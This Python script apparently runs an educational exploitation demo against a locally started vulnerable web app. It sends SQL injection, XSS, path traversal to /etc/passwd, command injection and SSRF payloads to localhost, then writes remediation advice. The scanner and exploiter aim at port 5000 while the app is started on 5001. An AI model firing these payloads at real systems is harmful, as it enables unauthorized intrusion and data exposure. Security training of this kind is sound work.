#!/usr/bin/env python3

"""
Complete Exploitation Demonstration
This script demonstrates the full process from vulnerability detection to exploitation.
"""

import subprocess
import json
import time
import os
import signal
import threading
import requests
from datetime import datetime

def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                Complete Vulnerability Exploitation Demonstration          ║
║                           From Detection to Exploitation                   ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)

def start_vulnerable_app():
    """Start the vulnerable web application"""
    print("\n[1] Starting vulnerable web application...")
    
    # Start the vulnerable app in a separate process on port 5001
    # Note: os.setsid is Unix-specific, using creationflags for Windows compatibility
    if os.name == 'nt':  # Windows
        process = subprocess.Popen(
            ['python', 'vulnerable_app.py', '--port', '5001'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
        )
    else:  # Unix/Linux/Mac
        process = subprocess.Popen(
            ['python', 'vulnerable_app.py', '--port', '5001'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid
        )
    
    # Wait for the app to start
    time.sleep(3)
    
    # Check if it's running
    try:
        response = requests.get('http://127.0.0.1:5001', timeout=5)
        if response.status_code == 200:
            print("[✅] Vulnerable application started successfully!")
            print("[ℹ️ ] Application running on: http://127.0.0.1:5001")
            return process
        else:
            print("[❌] Failed to start vulnerable application")
            return None
    except requests.exceptions.RequestException:
        print("[❌] Could not connect to vulnerable application")
        return None

def run_vulnerability_scan():
    """Run vulnerability scan on the vulnerable application"""
    print("\n[2] Running vulnerability scan...")
    
    # Run the web scanner
    result = subprocess.run([
        'python', 'web_scanner.py',
        '-v',
        '--timeout', '30',
        '--output', 'vulnerable_app_scan.json',
        'http://127.0.0.1:5000'
    ], capture_output=True, text=True)
    
    if result.returncode == 0:
        print("[✅] Vulnerability scan completed!")
        print("[ℹ️ ] Scan results saved to: vulnerable_app_scan.json")
        
        # Show scan results
        try:
            with open('vulnerable_app_scan.json', 'r') as f:
                scan_results = json.load(f)
                
            print(f"\n[📊] Scan Summary:")
            print(f"   - Target: {scan_results.get('scan_metadata', {}).get('target_url', 'Unknown')}")
            print(f"   - Scan Date: {scan_results.get('scan_metadata', {}).get('scan_date', 'Unknown')}")
            
            vulnerabilities = scan_results.get('vulnerabilities', [])
            if vulnerabilities:
                print(f"   - Vulnerabilities Found: {len(vulnerabilities)}")
                for vuln in vulnerabilities:
                    print(f"     • {vuln.get('vulnerability', 'Unknown')}: {vuln.get('severity', 'Unknown')}")
            else:
                print("   - No vulnerabilities detected")
                
        except Exception as e:
            print(f"[⚠️ ] Could not read scan results: {e}")
            
    else:
        print("[❌] Vulnerability scan failed!")
        print(f"Error: {result.stderr}")
        
    return result.returncode == 0

def run_exploitation():
    """Run exploitation against the vulnerable application"""
    print("\n[3] Running exploitation attempts...")
    
    # Run the PoC exploiter
    result = subprocess.run([
        'python', 'poc_exploiter.py',
        '--timeout', '10',
        '--output', 'exploitation_results.json',
        'http://127.0.0.1:5000'
    ], capture_output=True, text=True)
    
    if result.returncode == 0:
        print("[✅] Exploitation attempts completed!")
        print("[ℹ️ ] Exploitation results saved to: exploitation_results.json")
        
        # Show exploitation results
        try:
            with open('exploitation_results.json', 'r') as f:
                exploit_results = json.load(f)
                
            print(f"\n[🎯] Exploitation Summary:")
            summary = exploit_results.get('summary', {})
            successful = summary.get('successful_count', 0)
            total = summary.get('total_attempts', 0)
            
            print(f"   - Successful Exploits: {successful}/{total}")
            
            successful_exploits = exploit_results.get('successful_exploits', [])
            if successful_exploits:
                print(f"\n[🔥] Successful Exploits:")
                for exploit in successful_exploits:
                    print(f"   • {exploit.get('vulnerability', 'Unknown')}")
                    print(f"     Details: {exploit.get('details', 'N/A')}")
                    print(f"     Payload: {exploit.get('payload_used', 'N/A')[:50]}...")
                    print()
            else:
                print("   - No successful exploits")
                
        except Exception as e:
            print(f"[⚠️ ] Could not read exploitation results: {e}")
            
    else:
        print("[❌] Exploitation attempts failed!")
        print(f"Error: {result.stderr}")
        
    return result.returncode == 0

def demonstrate_manual_exploitation():
    """Demonstrate manual exploitation techniques"""
    print("\n[4] Demonstrating manual exploitation techniques...")
    
    base_url = "http://127.0.0.1:5001"
    
    print("\n[🎯] Manual Exploitation Examples:")
    
    # 1. SQL Injection
    print("\n[1] SQL Injection Demo:")
    sql_payload = "1' UNION SELECT 1,2,3,4--"
    try:
        response = requests.get(f"{base_url}/user?id={sql_payload}", timeout=5)
        print(f"   Payload: {sql_payload}")
        print(f"   Response: {response.text[:100]}...")
    except Exception as e:
        print(f"   Error: {e}")
    
    # 2. XSS
    print("\n[2] XSS Demo:")
    xss_payload = "<script>alert('XSS_PoC')</script>"
    try:
        response = requests.get(f"{base_url}/search?q={xss_payload}", timeout=5)
        print(f"   Payload: {xss_payload}")
        print(f"   Response contains payload: {xss_payload in response.text}")
    except Exception as e:
        print(f"   Error: {e}")
    
    # 3. LFI
    print("\n[3] LFI Demo:")
    lfi_payload = "../../../../etc/passwd"
    try:
        response = requests.get(f"{base_url}/include?file={lfi_payload}", timeout=5)
        print(f"   Payload: {lfi_payload}")
        print(f"   Response: {response.text[:100]}...")
    except Exception as e:
        print(f"   Error: {e}")
    
    # 4. Command Injection
    print("\n[4] Command Injection Demo:")
    cmd_payload = "id; whoami"
    try:
        response = requests.get(f"{base_url}/execute?cmd={cmd_payload}", timeout=5)
        print(f"   Payload: {cmd_payload}")
        print(f"   Response: {response.text[:100]}...")
    except Exception as e:
        print(f"   Error: {e}")
    
    # 5. SSRF
    print("\n[5] SSRF Demo:")
    ssrf_payload = "http://localhost:80"
    try:
        response = requests.get(f"{base_url}/fetch?url={ssrf_payload}", timeout=5)
        print(f"   Payload: {ssrf_payload}")
        print(f"   Response: {response.text[:100]}...")
    except Exception as e:
        print(f"   Error: {e}")

def generate_final_report():
    """Generate comprehensive final report"""
    print("\n[5] Generating comprehensive report...")
    
    report = {
        'demonstration_metadata': {
            'title': 'Complete Vulnerability Exploitation Demonstration',
            'date': datetime.now().isoformat(),
            'description': 'From vulnerability detection to successful exploitation',
            'tools_used': ['web_scanner.py', 'poc_exploiter.py', 'vulnerable_app.py']
        },
        'demonstration_steps': [
            {
                'step': 1,
                'action': 'Deploy vulnerable application',
                'purpose': 'Create controlled environment for testing'
            },
            {
                'step': 2,
                'action': 'Run vulnerability scanner',
                'purpose': 'Identify security weaknesses'
            },
            {
                'step': 3,
                'action': 'Execute exploitation attempts',
                'purpose': 'Demonstrate impact of discovered vulnerabilities'
            },
            {
                'step': 4,
                'action': 'Manual exploitation verification',
                'purpose': 'Confirm automated results'
            }
        ],
        'vulnerabilities_demonstrated': [
            'SQL Injection (Data Extraction)',
            'Cross-Site Scripting (XSS)',
            'Local File Inclusion (LFI)',
            'Command Injection',
            'Server-Side Request Forgery (SSRF)'
        ],
        'recommendations': [
            'Implement input validation and sanitization',
            'Use parameterized queries for database operations',
            'Apply proper output encoding to prevent XSS',
            'Implement access controls and file path restrictions',
            'Use allowlists for URL fetching functionality',
            'Implement proper command execution controls',
            'Regular security testing and code reviews'
        ]
    }
    
    # Save final report
    with open('complete_demonstration_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print("[✅] Comprehensive report generated!")
    print("[ℹ️ ] Report saved to: complete_demonstration_report.json")

def cleanup(vulnerable_process):
    """Clean up resources"""
    print("\n[6] Cleaning up...")
    
    if vulnerable_process:
        try:
            # Terminate the vulnerable application
            if os.name == 'nt':  # Windows
                vulnerable_process.terminate()
                vulnerable_process.wait()
            else:  # Unix/Linux/Mac
                os.killpg(os.getpgid(vulnerable_process.pid), signal.SIGTERM)
                vulnerable_process.wait()
            print("[✅] Vulnerable application stopped")
        except:
            pass
    
    print("[✅] Cleanup completed")

def main():
    print_banner()
    
    vulnerable_process = None
    
    try:
        # Step 1: Start vulnerable application
        vulnerable_process = start_vulnerable_app()
        if not vulnerable_process:
            return
        
        # Step 2: Run vulnerability scan
        if not run_vulnerability_scan():
            print("[!] Scanning failed, continuing with exploitation anyway...")
        
        # Step 3: Run exploitation
        if not run_exploitation():
            print("[!] Exploitation failed, trying manual demonstration...")
        
        # Step 4: Manual exploitation demonstration
        demonstrate_manual_exploitation()
        
        # Step 5: Generate final report
        generate_final_report()
        
        print("\n" + "="*80)
        print("[🎉] COMPLETE DEMONSTRATION FINISHED!")
        print("="*80)
        print("\n📋 Summary of what was demonstrated:")
        print("   • Vulnerability detection using automated scanner")
        print("   • Proof of concept exploitation of discovered vulnerabilities")
        print("   • Manual verification of exploitation techniques")
        print("   • Comprehensive reporting and recommendations")
        
        print("\n⚠️  IMPORTANT REMINDERS:")
        print("   • This was a controlled demonstration in an isolated environment")
        print("   • Never attempt these techniques without proper authorization")
        print("   • Always follow responsible disclosure practices")
        print("   • Security testing should only be performed legally and ethically")
        
    except KeyboardInterrupt:
        print("\n[!] Demonstration interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during demonstration: {e}")
    finally:
        cleanup(vulnerable_process)

if __name__ == "__main__":
    main()